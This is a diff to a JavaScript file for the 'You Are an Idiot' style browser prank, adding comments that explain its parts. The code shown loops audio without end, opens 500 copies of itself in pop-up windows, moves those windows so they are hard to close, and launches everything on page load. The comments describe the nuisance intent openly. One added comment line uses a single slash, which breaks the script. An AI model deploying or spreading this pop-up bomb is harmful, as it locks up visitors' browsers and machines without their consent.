@@ -1,6 +1,7 @@
 
 document.addEventListener('click', musicPlay);
-
+//this entire part is adding the music and making it play on a loop
+//When the music has played for 45 seconds, it resets the timestamp so it starts again. never-ending loop
 function musicPlay() {
     var audio = document.getElementById('youare-audio');
 	var micon = document.getElementById('youare-micon');
@@ -33,7 +34,7 @@ faudio.addEventListener('timeupdate', function() {
 }
 );
 
-
+//checks if user is using internet explorer. if so, it bookmarks the website. idiot internet explorer users lol
 function bookmark() {
 	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
 		var url = "index.html";
@@ -48,21 +49,21 @@ var yOff = 5;
 var xPos = 400;
 var yPos = -100;
 var flagRun = 1;
-
+//function for changing document title(used during testing)
 function changeTitle(title) {
 	document.title = title;
 }
-
+///function to open pop-ups
 function openWindow(url) {
 	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
 }
-
+/function that opens multiple pop-ups
 function proCreate() {	
 	for (var i = 0; i < 500; i++) {
 		openWindow('index.html');
 	}
 }
-
+//this entire block of code is just math stuff that makes the windows move around, making them even harder to close. try opening just one, and you'll see how it moves.
 function newXlt() {
 	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
 	window.focus();
@@ -103,7 +104,7 @@ function playBall() {
     }
 }
 
-
+//this executes the functions and actually makes the pop-ups
 window.onload = function () {
 	flagRun = 1;
 	
